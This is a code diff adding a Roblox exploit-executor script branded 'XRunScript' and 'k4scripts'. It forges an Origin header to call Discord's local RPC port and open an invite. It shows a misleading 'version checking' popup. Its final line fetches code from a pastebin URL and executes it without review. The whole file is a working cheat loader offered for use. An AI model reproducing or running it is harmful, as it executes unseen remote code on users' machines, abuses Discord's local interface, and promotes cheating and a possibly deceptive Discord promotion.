@@ -1,0 +1,52 @@
+local httpService = game:GetService("HttpService");
+
+local invCode = "Rt2CyyJ58q";
+local httpRequest = (syn and syn.request) or http_request or function() end;
+
+local function launchDiscord()
+	if not httpRequest then warn("Exploit not supported. No HTTP found.") return end
+	
+	httpRequest({
+		Url = "http://127.0.0.1:6463/rpc?v=1",
+		Method = "POST",
+	
+		Headers = {
+			['Content-Type'] = 'application/json',
+			Origin = 'https://discord.com'
+		},
+	
+		Body = httpService:JSONEncode({
+			cmd = 'INVITE_BROWSER',
+			nonce = httpService:GenerateGUID(false),
+			args = {code = invCode}
+		})
+	})
+end;
+
+local NotificationBindable = Instance.new("BindableFunction")
+NotificationBindable.OnInvoke = launchDiscord
+
+game:GetService("StarterGui"):SetCore(
+	"SendNotification",
+	{
+		Title = "XRunScript",
+		Duration = 5,
+		Text = "Latest Version Checking\n\nJoin DISCORD PREMIUM V8.0.0",
+		Button1 = "Invite link discord",
+		Callback = NotificationBindable
+	}
+)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/qExS3GvV"))();
+
+
+
+--	Powered by: k4scripts
+-- ╔═╗╔═╗╔═══╗        ╔═══╗              ╔╗ 
+-- ╚╗╚╝╔╝║╔═╗║        ║╔═╗║             ╔╝╚╗
+--  ╚╗╔╝ ║╚═╝║╔╗╔╗╔═╗ ║╚══╗╔══╗╔═╗╔╗╔══╗╚╗╔╝
+--  ╔╝╚╗ ║╔╗╔╝║║║║║╔╗╗╚══╗║║╔═╝║╔╝╠╣║╔╗║ ║║ 
+-- ╔╝╔╗╚╗║║║╚╗║╚╝║║║║║║╚═╝║║╚═╗║║ ║║║╚╝║ ║╚╗PREMIUM
+-- ╚═╝╚═╝╚╝╚═╝╚══╝╚╝╚╝╚═══╝╚══╝╚╝ ╚╝║╔═╝ ╚═╝
+--                                  ║║      
+--                                  ╚╝     
